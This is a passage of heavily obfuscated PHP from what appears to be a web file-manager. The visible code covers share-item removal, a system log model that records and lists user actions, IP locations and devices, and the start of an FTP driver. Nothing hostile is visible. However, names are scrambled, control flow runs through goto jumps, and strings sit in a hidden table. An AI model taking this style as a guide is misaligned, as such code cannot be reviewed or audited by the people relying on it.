Model($A®½ªœ—†Î[409])->removeNow($BÙìĞÍšä, !1); } goto f¡©¬‹ĞÇ†; fß¡ãÈŸ: $A®½ªœ—†Î =& $_SERVER[ä°„ä°º]; if (empty($F‚¬å¹ŠÊ)) { return; } $D²‰®ùÄº = array($A®½ªœ—†Î[447] => array($A®½ªœ—†Î[7], $F‚¬å¹ŠÊ)); goto AœĞÅê¦…; AœĞÅê¦…: $B«íÙ„¤ç = Model($A®½ªœ—†Î[1227])->where($D²‰®ùÄº)->field($A®½ªœ—†Î[395])->select(); if (!$B«íÙ„¤ç) { return; } $B«íÙ„¤ç = array_to_keyvalue($B«íÙ„¤ç, $A®½ªœ—†Î[33], $A®½ªœ—†Î[395]); goto d ÷íÂå©Ù; f¡©¬‹ĞÇ†: } private function removeShareItems($b‘›ÏŠ–”) { goto FÎÙÎŸ¼á‡; bè¤‡âÇœ: Model($a¾ˆé¸İ…Ç[576])->remove($c°ÇËé¥Á); goto Cø¯î¡‡Ïï; FÎÙÎŸ¼á‡: $a¾ˆé¸İ…Ç =& $_SERVER[ä°„ä°º]; $E¥¹ÀŠµåÖ = "\173\151\157\72{$b‘›ÏŠ–”}\x7d\57"; $AÃëßœ° = array($a¾ˆé¸İ…Ç[395] => 0, $a¾ˆé¸İ…Ç[1092] => array($a¾ˆé¸İ…Ç[380], "{$E¥¹ÀŠµåÖ}\x25")); goto DÛÇ××°ƒ; DÛÇ××°ƒ: $Fà¯Õ«‹İŒ = Model($a¾ˆé¸İ…Ç[1697])->where($AÃëßœ°)->field($a¾ˆé¸İ…Ç[468])->select(); if (empty($Fà¯Õ«‹İŒ)) { return; } $c°ÇËé¥Á = array_to_keyvalue($Fà¯Õ«‹İŒ, $a¾ˆé¸İ…Ç[33], $a¾ˆé¸İ…Ç[468]); goto bè¤‡âÇœ; Cø¯î¡‡Ïï: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\x4c\x69\147\150\164\101\x70\x70"; public $modelType = "\x53\171\x73\x74\x65\155\117\160\164\151\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\x67\x72\157\165\x70", "\x64\x65\x73\x63", "\143\x6f\156\x74\145\156\164"); public function listData($b‡©œ½ø” = false, $aãˆ÷‘¬Œ = "\x6d\x6f\144\151\x66\x79\124\x69\x6d\x65", $F¼¤¼‘µ¨ö = true) { return parent::listData($b‡©œ½ø”, $aãˆ÷‘¬Œ, $F¼¤¼‘µ¨ö); } public function remove($B˜Âó¿ÉÚâ) { $fÁ¿áÌ‡Õ = $this->findByName($B˜Âó¿ÉÚâ); if (!$fÁ¿áÌ‡Õ) { return !1; } return parent::remove($fÁ¿áÌ‡Õ[$_SERVER[ä°„ä°º][393]]); } public function add($eá•–ƒƒ¼’) { if ($this->findByName($eá•–ƒƒ¼’[$_SERVER[ä°„ä°º][28]])) { return !1; } return parent::insert($eá•–ƒƒ¼’); } public function update($b–÷ƒ®èóĞ, $f´Ë®ª“†î) { $d‰×Ö†¹ÇÃ =& $_SERVER[ä°„ä°º]; $F…—àË¿’Ï = $this->findByName($b–÷ƒ®èóĞ); $C¿ùÜÕØÎ´ = $this->findByName($f´Ë®ª“†î[$d‰×Ö†¹ÇÃ[28]]); if (!$F…—àË¿’Ï || $C¿ùÜÕØÎ´ && $C¿ùÜÕØÎ´[$d‰×Ö†¹ÇÃ[393]] != $F…—àË¿’Ï[$d‰×Ö†¹ÇÃ[393]]) { return !1; } return parent::update($F…—àË¿’Ï[$d‰×Ö†¹ÇÃ[393]], $f´Ë®ª“†î); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\124\x69\x6d\145", "\x74\151\155\145", "\151\x6e\163\x65\162\164", "\x66\165\156\143\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Fë÷Ğ†Ï½Ò =& $_SERVER[ä°„ä°º]; return array($Fë÷Ğ†Ï½Ò[2031] => LNG($Fë÷Ğ†Ï½Ò[2032]), $Fë÷Ğ†Ï½Ò[2033] => LNG($Fë÷Ğ†Ï½Ò[2034]), $Fë÷Ğ†Ï½Ò[1660] => LNG($Fë÷Ğ†Ï½Ò[2035]), $Fë÷Ğ†Ï½Ò[2036] => LNG($Fë÷Ğ†Ï½Ò[2037]), $Fë÷Ğ†Ï½Ò[2038] => LNG($Fë÷Ğ†Ï½Ò[2039]), $Fë÷Ğ†Ï½Ò[2040] => LNG($Fë÷Ğ†Ï½Ò[2041]), $Fë÷Ğ†Ï½Ò[2042] => LNG($Fë÷Ğ†Ï½Ò[2043]), $Fë÷Ğ†Ï½Ò[1690] => LNG($Fë÷Ğ†Ï½Ò[2043]), $Fë÷Ğ†Ï½Ò[1691] => LNG($Fë÷Ğ†Ï½Ò[2044]), $Fë÷Ğ†Ï½Ò[2045] => LNG($Fë÷Ğ†Ï½Ò[2046]), $Fë÷Ğ†Ï½Ò[2047] => LNG($Fë÷Ğ†Ï½Ò[2048]), $Fë÷Ğ†Ï½Ò[2049] => LNG($Fë÷Ğ†Ï½Ò[2050]), $Fë÷Ğ†Ï½Ò[2051] => LNG($Fë÷Ğ†Ï½Ò[2052]), $Fë÷Ğ†Ï½Ò[1688] => LNG($Fë÷Ğ†Ï½Ò[2053]), $Fë÷Ğ†Ï½Ò[2054] => LNG($Fë÷Ğ†Ï½Ò[2055]), $Fë÷Ğ†Ï½Ò[1695] => LNG($Fë÷Ğ†Ï½Ò[2056]), $Fë÷Ğ†Ï½Ò[2057] => LNG($Fë÷Ğ†Ï½Ò[2058]), $Fë÷Ğ†Ï½Ò[2059] => LNG($Fë÷Ğ†Ï½Ò[2060]), $Fë÷Ğ†Ï½Ò[2061] => LNG($Fë÷Ğ†Ï½Ò[2062]), $Fë÷Ğ†Ï½Ò[2063] => LNG($Fë÷Ğ†Ï½Ò[2064]), $Fë÷Ğ†Ï½Ò[1698] => LNG($Fë÷Ğ†Ï½Ò[2065]), $Fë÷Ğ†Ï½Ò[1699] => LNG($Fë÷Ğ†Ï½Ò[2066]), $Fë÷Ğ†Ï½Ò[2067] => LNG($Fë÷Ğ†Ï½Ò[2068]), $Fë÷Ğ†Ï½Ò[2069] => LNG($Fë÷Ğ†Ï½Ò[2070]), $Fë÷Ğ†Ï½Ò[2071] => LNG($Fë÷Ğ†Ï½Ò[2072]), $Fë÷Ğ†Ï½Ò[1693] => LNG($Fë÷Ğ†Ï½Ò[2073]), $Fë÷Ğ†Ï½Ò[2074] => LNG($Fë÷Ğ†Ï½Ò[2075]), $Fë÷Ğ†Ï½Ò[1692] => LNG($Fë÷Ğ†Ï½Ò[2076]), $Fë÷Ğ†Ï½Ò[2077] => LNG($Fë÷Ğ†Ï½Ò[2078]), $Fë÷Ğ†Ï½Ò[2079] => LNG($Fë÷Ğ†Ï½Ò[2080]), $Fë÷Ğ†Ï½Ò[2081] => LNG($Fë÷Ğ†Ï½Ò[2082]), $Fë÷Ğ†Ï½Ò[2083] => LNG($Fë÷Ğ†Ï½Ò[2083]), $Fë÷Ğ†Ï½Ò[2084] => LNG($Fë÷Ğ†Ï½Ò[1664]), $Fë÷Ğ†Ï½Ò[2085] => LNG($Fë÷Ğ†Ï½Ò[2086]), $Fë÷Ğ†Ï½Ò[2087] => LNG($Fë÷Ğ†Ï½Ò[2088]), $Fë÷Ğ†Ï½Ò[2089] => LNG($Fë÷Ğ†Ï½Ò[2090]), $Fë÷Ğ†Ï½Ò[2091] => LNG($Fë÷Ğ†Ï½Ò[2092]), $Fë÷Ğ†Ï½Ò[2093] => LNG($Fë÷Ğ†Ï½Ò[2094]), $Fë÷Ğ†Ï½Ò[2095] => LNG($Fë÷Ğ†Ï½Ò[2095]), $Fë÷Ğ†Ï½Ò[2096] => LNG($Fë÷Ğ†Ï½Ò[2097]), $Fë÷Ğ†Ï½Ò[2098] => LNG($Fë÷Ğ†Ï½Ò[2099]), $Fë÷Ğ†Ï½Ò[2100] => LNG($Fë÷Ğ†Ï½Ò[2101]), $Fë÷Ğ†Ï½Ò[2102] => LNG($Fë÷Ğ†Ï½Ò[2103]), $Fë÷Ğ†Ï½Ò[2104] => LNG($Fë÷Ğ†Ï½Ò[2105]), $Fë÷Ğ†Ï½Ò[2106] => LNG($Fë÷Ğ†Ï½Ò[2107])); } private function typeFile() { $b´š¼¶Áäƒ =& $_SERVER[ä°„ä°º]; $Dö¯““ô†¦ = array($b´š¼¶Áäƒ[1695] => array($b´š¼¶Áäƒ[1696]), $b´š¼¶Áäƒ[2049] => array($b´š¼¶Áäƒ[2108]), $b´š¼¶Áäƒ[2051] => array($b´š¼¶Áäƒ[2109]), $b´š¼¶Áäƒ[1688] => array($b´š¼¶Áäƒ[1689]), $b´š¼¶Áäƒ[2059] => array(), $b´š¼¶Áäƒ[2061] => array(), $b´š¼¶Áäƒ[2063] => array(), $b´š¼¶Áäƒ[1698] => array($b´š¼¶Áäƒ[1700]), $b´š¼¶Áäƒ[1699] => array($b´š¼¶Áäƒ[1700]), $b´š¼¶Áäƒ[2067] => array($b´š¼¶Áäƒ[2110]), $b´š¼¶Áäƒ[2069] => array($b´š¼¶Áäƒ[2110]), $b´š¼¶Áäƒ[2071] => array($b´š¼¶Áäƒ[2111]), $b´š¼¶Áäƒ[2057] => array($b´š¼¶Áäƒ[2112]), $b´š¼¶Áäƒ[1693] => array($b´š¼¶Áäƒ[2113]), $b´š¼¶Áäƒ[2074] => array($b´š¼¶Áäƒ[2114]), $b´š¼¶Áäƒ[1692] => array($b´š¼¶Áäƒ[1694])); return $Dö¯““ô†¦; } private function typeAll() { goto b™¹÷”Œ; C¹‰éíâÊ¸: foreach ($bÓ ¤××Ç‹ as $bÉ‹Áåò’‰ => $CŒ¸½Ú…®ƒ) { $b¡é‰ÃÁÅø[$CŒ¸½Ú…®ƒ[0]] = $b¡é‰ÃÁÅø[$bÉ‹Áåò’‰]; } $b¡é‰ÃÁÅø[$AÖ¾Î¨èİ³[1700]] = LNG($AÖ¾Î¨èİ³[2115]); $b¡é‰ÃÁÅø[$AÖ¾Î¨èİ³[2110]] = LNG($AÖ¾Î¨èİ³[2116]); goto dƒéï»‡ÆÀ; b™¹÷”Œ: $AÖ¾Î¨èİ³ =& $_SERVER[ä°„ä°º]; $b¡é‰ÃÁÅø = $this->typeList; $bÓ ¤××Ç‹ = array_filter($this->typeFile()); goto C¹‰éíâÊ¸; dƒéï»‡ÆÀ: return $b¡é‰ÃÁÅø; goto DÉ‡ËŒ‡èŠ; DÉ‡ËŒ‡èŠ: } public function addLog($Fá¡æçĞñØ, $Eğëã„£‹¤ = array()) { goto bÙáç©íç; dÑ¥ÃˆÔ»: $Eğëã„£‹¤ = array($EÄÃ¨ÈÏáÇ[1541] => Session::sign(), $EÄÃ¨ÈÏáÇ[1542] => $dÖœøĞ¬Ê, $EÄÃ¨ÈÏáÇ[29] => $Fá¡æçĞñØ, $EÄÃ¨ÈÏáÇ[1544] => json_encode($Eğëã„£‹¤)); parent::add($Eğëã„£‹¤); goto D±™¦ôÃä¹; bÙáç©íç: $EÄÃ¨ÈÏáÇ =& $_SERVER[ä°„ä°º]; if (!isset($this->typeList[$Fá¡æçĞñØ])) { return; } $dÖœøĞ¬Ê = defined($EÄÃ¨ÈÏáÇ[454]) && USER_ID ? USER_ID : (isset($Eğëã„£‹¤[$EÄÃ¨ÈÏáÇ[1551]]) ? $Eğëã„£‹¤[$EÄÃ¨ÈÏáÇ[1551]] : 0); goto D¹ŠÒØß´; D¹ŠÒØß´: if (!$dÖœøĞ¬Ê) { $dÖœøĞ¬Ê = (int) Session::get($EÄÃ¨ÈÏáÇ[1846]); } $eÑá£­Ÿ‘Ş = get_client_ip(); if (!$Eğëã„£‹¤ || strlen(json_encode($Eğëã„£‹¤)) >= 1024) { $Eğëã„£‹¤ = array($EÄÃ¨ÈÏáÇ[2117] => $eÑá£­Ÿ‘Ş); } else { if (is_array($Eğëã„£‹¤)) { $Eğëã„£‹¤[$EÄÃ¨ÈÏáÇ[2117]] = $eÑá£­Ÿ‘Ş; } else { $Eğëã„£‹¤ = array($EÄÃ¨ÈÏáÇ[1109] => $Eğëã„£‹¤, $EÄÃ¨ÈÏáÇ[2117] => $eÑá£­Ÿ‘Ş); } } goto dÑ¥ÃˆÔ»; D±™¦ôÃä¹: } public function remove($aõ£Ì©á°ä) { $this->where(array($_SERVER[ä°„ä°º][412] => $aõ£Ì©á°ä))->delete(); } private function _makeOrder($CİÏ‚Ö«Ãõ = '') { goto BŒ—ÌóçË; Aé¯‰¡–İŞ: return $this->order($CİÏ‚Ö«Ãõ); goto c¾™À¬³…†; BŒ—ÌóçË: $bƒ¾ùˆ’­á =& $_SERVER[ä°„ä°º]; $BòÀíŞ¯õÜ = $bƒ¾ùˆ’­á[194]; $f¼ÈÀĞÜ‰à = array($bƒ¾ùˆ’­á[428] => $bƒ¾ùˆ’­á[429], $bƒ¾ùˆ’­á[430] => $bƒ¾ùˆ’­á[431]); goto aÅæ¶ÃİÇ; aÅæ¶ÃİÇ: $a®Ä¶ĞŸÎ = Input::get($bƒ¾ùˆ’­á[436], $bƒ¾ùˆ’­á[7], $bƒ¾ùˆ’­á[1878], array($bƒ¾ùˆ’­á[1802], $bƒ¾ùˆ’­á[430])); $a®Ä¶ĞŸÎ = $f¼ÈÀĞÜ‰à[$a®Ä¶ĞŸÎ]; $CİÏ‚Ö«Ãõ = $CİÏ‚Ö«Ãõ . "{$BòÀíŞ¯õÜ}\40{$a®Ä¶ĞŸÎ}"; goto Aé¯‰¡–İŞ; c¾™À¬³…†: } public function get($Cö¯¤‹˜ø¶ = '') { goto a¢öêîÇ†ß; CŸäî˜ÖÕÊ: $f‹†£®È[$AÌÓŠ³¬ğù[367]] = $this->logList($f‹†£®È[$AÌÓŠ³¬ğù[367]]); return $f‹†£®È; goto eî…Æ·Ï; Cù³ˆÕˆ—©: if (!empty($Cö¯¤‹˜ø¶[$AÌÓŠ³¬ğù[2117]])) { $d£ö”Ò®³[$AÌÓŠ³¬ğù[431]] = array($AÌÓŠ³¬ğù[380], "\x25{$Cö¯¤‹˜ø¶[$AÌÓŠ³¬ğù[2117]]}\x25"); } $f‹†£®È = $this->_makeOrder()->where($d£ö”Ò®³)->selectPage(); if (empty($f‹†£®È[$AÌÓŠ³¬ğù[367]])) { show_json(array(), !0, $f‹†£®È[$AÌÓŠ³¬ğù[364]]); } goto CŸäî˜ÖÕÊ; DôÙ –™¾ï: if ($Cö¯¤‹˜ø¶[$AÌÓŠ³¬ğù[1551]]) { $d£ö”Ò®³[$AÌÓŠ³¬ğù[1551]] = $Cö¯¤‹˜ø¶[$AÌÓŠ³¬ğù[1551]]; } if (isset($Cö¯¤‹˜ø¶[$AÌÓŠ³¬ğù[744]])) { $cî®²øµÁ = $Cö¯¤‹˜ø¶[$AÌÓŠ³¬ğù[744]]; $b…¿¹™¾ôÃ = isset($Cö¯¤‹˜ø¶[$AÌÓŠ³¬ğù[476]]) ? $Cö¯¤‹˜ø¶[$AÌÓŠ³¬ğù[476]] : time(); $d£ö”Ò®³[$AÌÓŠ³¬ğù[194]] = array($AÌÓŠ³¬ğù[331], array($cî®²øµÁ, $b…¿¹™¾ôÃ)); } if ($Cö¯¤‹˜ø¶[$AÌÓŠ³¬ğù[29]]) { $cáè¸¸†×… = explode($AÌÓŠ³¬ğù[47], $Cö¯¤‹˜ø¶[$AÌÓŠ³¬ğù[29]]); $EÜ¦ÇäÙ¿„ = $this->typeFile(); $aĞ›ĞÎâ‰› = array(); foreach ($cáè¸¸†×… as $DÑ¾ÊÖ¼Šñ) { $aĞ›ĞÎâ‰›[] = $DÑ¾ÊÖ¼Šñ; if (isset($EÜ¦ÇäÙ¿„[$DÑ¾ÊÖ¼Šñ])) { $aĞ›ĞÎâ‰› = array_merge($aĞ›ĞÎâ‰›, $EÜ¦ÇäÙ¿„[$DÑ¾ÊÖ¼Šñ]); } } $aĞ›ĞÎâ‰› = array_unique($aĞ›ĞÎâ‰›); if ($aĞ›ĞÎâ‰›) { $d£ö”Ò®³[$AÌÓŠ³¬ğù[29]] = array($AÌÓŠ³¬ğù[7], $aĞ›ĞÎâ‰›); } } else { $d£ö”Ò®³[$AÌÓŠ³¬ğù[29]] = array($AÌÓŠ³¬ğù[2118], $AÌÓŠ³¬ğù[2119]); } goto Cù³ˆÕˆ—©; a¢öêîÇ†ß: $AÌÓŠ³¬ğù =& $_SERVER[ä°„ä°º]; if (!$Cö¯¤‹˜ø¶) { show_json(array()); } $d£ö”Ò®³ = array(); goto DôÙ –™¾ï; eî…Æ·Ï: } private function ipAddress(&$c”å‹ÜÜÌÔ) { $BÔõÙÉ² =& $_SERVER[ä°„ä°º]; if (!empty($c”å‹ÜÜÌÔ[$BÔõÙÉ²[2117]])) { $FŞ¶â‘Ö» = IpLocation::get($c”å‹ÜÜÌÔ[$BÔõÙÉ²[2117]]); } else { $FŞ¶â‘Ö» = LNG($BÔõÙÉ²[2120]); } $c”å‹ÜÜÌÔ[$BÔõÙÉ²[2121]] = $FŞ¶â‘Ö»; } private function descZipDownload($AÒ¨¡µŒî¶, &$dÎ¿°««) { $c»ù–¼¡ Ş =& $_SERVER[ä°„ä°º]; if (!isset($AÒ¨¡µŒî¶[$c»ù–¼¡ Ş[2122]])) { return; } $Fá¿ªÀğÂ = json_decode($AÒ¨¡µŒî¶[$c»ù–¼¡ Ş[2122]], !0); foreach ($Fá¿ªÀğÂ as $bóÆéÀÆ¶Î) { try { $b–ØØ¾ÏœÑ = IO::infoFull($bóÆéÀÆ¶Î[$c»ù–¼¡ Ş[76]]); } catch (Exception $D¢ÚĞÃ•Ş¨) { continue; } $AÒ¨¡µŒî¶[$c»ù–¼¡ Ş[76]] = $bóÆéÀÆ¶Î[$c»ù–¼¡ Ş[76]]; $dÎ¿°««[] = $AÒ¨¡µŒî¶[$c»ù–¼¡ Ş[395]] = $b–ØØ¾ÏœÑ[$c»ù–¼¡ Ş[395]]; $dÎ¿°««[] = $AÒ¨¡µŒî¶[$c»ù–¼¡ Ş[1933]] = $b–ØØ¾ÏœÑ[$c»ù–¼¡ Ş[478]]; break; } return $AÒ¨¡µŒî¶; } private function getSourceList(&$C¡¼ãåõ¨) { $F÷ˆ†«•Á =& $_SERVER[ä°„ä°º]; $c„±ô„òŸˆ = array(); foreach ($C¡¼ãåõ¨ as $bìŠëÕ¼¨ => $B…ŞÙ”«õÁ) { goto C÷Ş›ëññ§; C÷Ş›ëññ§: $f³ÎÎ•¥´³ = json_decode($B…ŞÙ”«õÁ[$F÷ˆ†«•Á[431]], !0); if ($B…ŞÙ”«õÁ[$F÷ˆ†«•Á[29]] == $F÷ˆ†«•Á[1691]) { $f³ÎÎ•¥´³ = $this->descZipDownload($f³ÎÎ•¥´³, $c„±ô„òŸˆ); $C¡¼ãåõ¨[$bìŠëÕ¼¨][$F÷ˆ†«•Á[431]] = json_encode($f³ÎÎ•¥´³); continue; } if (strpos($B…ŞÙ”«õÁ[$F÷ˆ†«•Á[29]], $F÷ˆ†«•Á[1934]) !== 0) { if (!isset($f³ÎÎ•¥´³[$F÷ˆ†«•Á[76]]) || strpos($B…ŞÙ”«õÁ[$F÷ˆ†«•Á[29]], $F÷ˆ†«•Á[2123]) !== 0) { continue; } try { $AÚŒĞ¿ÀÌè = IO::infoFull($f³ÎÎ•¥´³[$F÷ˆ†«•Á[76]]); } catch (Exception $cò‘«öÒ—) { continue; } $c„±ô„òŸˆ[] = $f³ÎÎ•¥´³[$F÷ˆ†«•Á[395]] = $AÚŒĞ¿ÀÌè[$F÷ˆ†«•Á[395]]; $c„±ô„òŸˆ[] = $f³ÎÎ•¥´³[$F÷ˆ†«•Á[1933]] = $AÚŒĞ¿ÀÌè[$F÷ˆ†«•Á[478]]; $C¡¼ãåõ¨[$bìŠëÕ¼¨][$F÷ˆ†«•Á[431]] = json_encode($f³ÎÎ•¥´³); continue; } goto BŒİ˜«’¾; bˆ°¦Òô¯×: if ($f³ÎÎ•¥´³[$F÷ˆ†«•Á[29]] == $F÷ˆ†«•Á[1941]) { $c„±ô„òŸˆ[] = $f³ÎÎ•¥´³[$F÷ˆ†«•Á[431]][$F÷ˆ†«•Á[395]]; } goto F¢ïÖ‹Äš‰; BŒİ˜«’¾: $c„±ô„òŸˆ[] = $f³ÎÎ•¥´³[$F÷ˆ†«•Á[395]]; $c„±ô„òŸˆ[] = $f³ÎÎ•¥´³[$F÷ˆ†«•Á[1933]]; if ($f³ÎÎ•¥´³[$F÷ˆ†«•Á[29]] == $F÷ˆ†«•Á[533]) { $c„±ô„òŸˆ[] = $f³ÎÎ•¥´³[$F÷ˆ†«•Á[431]][$F÷ˆ†«•Á[1076]]; $c„±ô„òŸˆ[] = $f³ÎÎ•¥´³[$F÷ˆ†«•Á[431]][$F÷ˆ†«•Á[1077]]; } goto bˆ°¦Òô¯×; F¢ïÖ‹Äš‰: } if (!$c„±ô„òŸˆ) { return array(); } return Model($F÷ˆ†«•Á[813])->sourceListInfo($c„±ô„òŸˆ, !0); } private function logList($fÍÌá½ï‹) { goto eÀİ®®‹; eÀİ®®‹: $C«²Äİß±§ =& $_SERVER[ä°„ä°º]; $bßÆóÁ˜¿ì = array_to_keyvalue($fÍÌá½ï‹, $C«²Äİß±§[33], $C«²Äİß±§[1551]); $fñÖ›¶µ– = Model($C«²Äİß±§[519])->userListInfo(array_unique($bßÆóÁ˜¿ì)); goto A‚Ä´‚ß›®; A‚Ä´‚ß›®: $fÌ‘É˜Ÿ™ = $this->getSourceList($fÍÌá½ï‹); $bí¯“ˆ×¢ = $this->typeAll(); $Bì˜‚´Ü¿¥ = array(); goto Eº¾ Ú÷¹Ü; Eº¾ Ú÷¹Ü: $eö–éÎÎó = array(); foreach ($fÍÌá½ï‹ as $cÉğŒÊ°„ï => $E«¿á¹î½„) { goto BÜŠ« Œ¥¡; c…„ä¼‡“: $E«¿á¹î½„[$C«²Äİß±§[28]] = isset($eÏ‘¦ëß¬Ü[$C«²Äİß±§[28]]) ? $eÏ‘¦ëß¬Ü[$C«²Äİß±§[28]] : LNG($C«²Äİß±§[2120]); $E«¿á¹î½„[$C«²Äİß±§[1983]] = isset($eÏ‘¦ëß¬Ü[$C«²Äİß±§[1983]]) ? $eÏ‘¦ëß¬Ü[$C«²Äİß±§[1983]] : $C«²Äİß±§[33]; $E«¿á¹î½„[$C«²Äİß±§[1454]] = isset($bí¯“ˆ×¢[$eŠƒ‘·ù‡ä]) ? $bí¯“ˆ×¢[$eŠƒ‘·ù‡ä] : $A»³¾†­ŠÙ; goto fÉÑá¡»†; BŒó¥Ê¿ºğ: $this->ipAddress($E«¿á¹î½„); if (strpos($eŠƒ‘·ù‡ä, $C«²Äİß±§[1934]) === 0 || isset($bĞöÔ©é[$C«²Äİß±§[1933]])) { goto F˜–¿ò³²½; F˜–¿ò³²½: $bĞöÔ©é[$C«²Äİß±§[85]] = $fÌ‘É˜Ÿ™[$bĞöÔ©é[$C«²Äİß±§[395]]]; $bĞöÔ©é[$C«²Äİß±§[1946]] = $fÌ‘É˜Ÿ™[$bĞöÔ©é[$C«²Äİß±§[1933]]]; if ($bĞöÔ©é[$C«²Äİß±§[29]] == $C«²Äİß±§[533]) { $bĞöÔ©é[$C«²Äİß±§[431]][$C«²Äİß±§[1076]] = $fÌ‘É˜Ÿ™[$bĞöÔ©é[$C«²Äİß±§[431]][$C«²Äİß±§[1076]]]; $bĞöÔ©é[$C«²Äİß±§[431]][$C«²Äİß±§[1077]] = $fÌ‘É˜Ÿ™[$bĞöÔ©é[$C«²Äİß±§[431]][$C«²Äİß±§[1077]]]; } goto e°¯½Ü…Šå; e°¯½Ü…Šå: if ($bĞöÔ©é[$C«²Äİß±§[29]] == $C«²Äİß±§[1941]) { $bĞöÔ©é[$C«²Äİß±§[431]][$C«²Äİß±§[395]] = $fÌ‘É˜Ÿ™[$bĞöÔ©é[$C«²Äİß±§[431]][$C«²Äİß±§[395]]]; } if ($bĞöÔ©é[$C«²Äİß±§[29]] == $C«²Äİß±§[1686]) { $bĞöÔ©é[$C«²Äİß±§[1946]] = $bĞöÔ©é[$C«²Äİß±§[85]]; $bĞöÔ©é[$C«²Äİß±§[1933]] = $bĞöÔ©é[$C«²Äİß±§[1946]][$C«²Äİß±§[395]]; $bĞöÔ©é[$C«²Äİß±§[85]] = !1; $bĞöÔ©é[$C«²Äİß±§[395]] = $C«²Äİß±§[33]; } if ($bĞöÔ©é[$C«²Äİß±§[85]] && $bĞöÔ©é[$C«²Äİß±§[85]][$C«²Äİß±§[404]] == $C«²Äİß±§[1192]) { $eö–éÎÎó[] = $E«¿á¹î½„[$C«²Äİß±§[393]]; unset($fÍÌá½ï‹[$cÉğŒÊ°„ï]); continue; } goto Fù½…Ø®Øö; Fù½…Ø®Øö: if ($bĞöÔ©é[$C«²Äİß±§[1946]] && $bĞöÔ©é[$C«²Äİß±§[1946]][$C«²Äİß±§[404]] == $C«²Äİß±§[1192]) { $eö–éÎÎó[] = $E«¿á¹î½„[$C«²Äİß±§[393]]; unset($fÍÌá½ï‹[$cÉğŒÊ°„ï]); continue; } goto C¯ÀŒÃã†Ô; C¯ÀŒÃã†Ô: } $E«¿á¹î½„[$C«²Äİß±§[431]] = $bĞöÔ©é; goto E÷Ëªˆİª¤; BÜŠ« Œ¥¡: $eŠƒ‘·ù‡ä = $E«¿á¹î½„[$C«²Äİß±§[29]]; $eÏ‘¦ëß¬Ü = isset($fñÖ›¶µ–[$E«¿á¹î½„[$C«²Äİß±§[1551]]]) ? $fñÖ›¶µ–[$E«¿á¹î½„[$C«²Äİß±§[1551]]] : !1; $A»³¾†­ŠÙ = strpos($eŠƒ‘·ù‡ä, $C«²Äİß±§[2124]) === 0 ? LNG($C«²Äİß±§[2125]) : LNG($C«²Äİß±§[2120]); goto c…„ä¼‡“; E÷Ëªˆİª¤: unset($E«¿á¹î½„[$C«²Äİß±§[2126]]); $Bì˜‚´Ü¿¥[] = $E«¿á¹î½„; goto f˜¶Î÷Ü¡¯; fÉÑá¡»†: $E«¿á¹î½„[$C«²Äİß±§[1877]] = $eÏ‘¦ëß¬Ü; $bĞöÔ©é = json_decode($E«¿á¹î½„[$C«²Äİß±§[431]], !0); $E«¿á¹î½„[$C«²Äİß±§[2117]] = isset($bĞöÔ©é[$C«²Äİß±§[2117]]) ? $bĞöÔ©é[$C«²Äİß±§[2117]] : $C«²Äİß±§[33]; goto BŒó¥Ê¿ºğ; f˜¶Î÷Ü¡¯: } $this->clearSystemPathLog($eö–éÎÎó); goto bèŠ¤ã»Ôñ; bèŠ¤ã»Ôñ: return $Bì˜‚´Ü¿¥; goto fÔÌ˜Ï‡Ø; fÔÌ˜Ï‡Ø: } private function clearSystemPathLog($d¥ˆé×„â) { $dõñî…áÑ« =& $_SERVER[ä°„ä°º]; if (count($d¥ˆé×„â) == 0) { return; } $C¸¾Òó‘·† = array($dõñî…áÑ«[393] => array($dõñî…áÑ«[7], array_unique($d¥ˆé×„â))); $this->where($C¸¾Òó‘·†)->delete(); } public function deviceList($CíÙÍñ¬íë, $B©¯çßÃŒ = 0) { $a™ÔÜ…†é• =& $_SERVER[ä°„ä°º]; $Cæá¿ø°‘ = array($a™ÔÜ…†é•[1551] => $CíÙÍñ¬íë, $a™ÔÜ…†é•[194] => array($a™ÔÜ…†é•[993], $B©¯çßÃŒ), $a™ÔÜ…†é•[29] => $a™ÔÜ…†é•[1660]); $dÌ¯‚À®­ = array(); $cÄÃŞ÷óã = $this->field($a™ÔÜ…†é•[2127])->where($Cæá¿ø°‘)->order($a™ÔÜ…†é•[1944])->limit(50)->select(); foreach ($cÄÃŞ÷óã as $fÓøœŒÀœ => $B¿ºÖ–²‰™) { goto EÊ†µ‚Õ»±; fó¸áƒØ‡î: unset($f¢¶ö»é¼–[$a™ÔÜ…†é•[2117]]); $c±Ë¬“µ¥ = $this->deviceType($f¢¶ö»é¼–[$a™ÔÜ…†é•[1935]]); if (isset($dÌ¯‚À®­[$c±Ë¬“µ¥])) { continue; } goto c¼ìÂÈÅ‘¯; EÊ†µ‚Õ»±: if ($fÓøœŒÀœ > 0 && abs($B¿ºÖ–²‰™[$a™ÔÜ…†é•[194]] - $cÄÃŞ÷óã[$fÓøœŒÀœ - 1][$a™ÔÜ…†é•[194]]) < 5) { continue; } $f¢¶ö»é¼– = json_decode($B¿ºÖ–²‰™[$a™ÔÜ…†é•[431]], !0); $B¿ºÖ–²‰™[$a™ÔÜ…†é•[2117]] = isset($f¢¶ö»é¼–[$a™ÔÜ…†é•[2117]]) ? $f¢¶ö»é¼–[$a™ÔÜ…†é•[2117]] : $a™ÔÜ…†é•[33]; goto fó¸áƒØ‡î; c¼ìÂÈÅ‘¯: $this->ipAddress($B¿ºÖ–²‰™); $B¿ºÖ–²‰™[$a™ÔÜ…†é•[431]] = $f¢¶ö»é¼–; $dÌ¯‚À®­[$c±Ë¬“µ¥] = $B¿ºÖ–²‰™; goto d¯‚‘™Íøé; d¯‚‘™Íøé: } return array_values($dÌ¯‚À®­); } public function deviceType($f’ŸÉ‰•) { return $f’ŸÉ‰•; } } goto bŒóŒ¢Ê; bºšõ»œ½: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($F¯Ú±«Ú‚Æ) { parent::__construct(); if (count($F¯Ú±«Ú‚Æ) > 0) { $this->_init($F¯Ú±«Ú‚Æ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($e‰íÚ›¬¢) { 